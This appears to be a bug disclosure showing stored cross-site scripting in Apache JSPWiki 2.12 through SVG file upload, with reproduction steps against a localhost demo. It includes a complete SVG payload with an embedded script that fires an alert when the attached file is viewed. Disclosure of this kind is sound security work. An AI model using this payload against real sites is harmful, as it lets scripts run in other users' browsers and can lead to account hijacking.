###  In Apache JSPWiki 2.12 i found stored xss through upload svg file.

Apache JSPWiki 2.12 

Demo installation: http://localhost:8080

### Reproduce bug:

Step 1: Access to http://localhost:8080/Upload.jsp?page=UnusedPages.
In default, apache jspwiki accept upload svg file so i try to upload svg file with content payload xss:
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("Ghostlulz XSS");
   </script>
</svg>
```

![](3.png)

![](2.png)

Step 3: The image will upload to /attach/UnusedPages/$filename/ . Access to file -> XSS trigger

![](1.png)

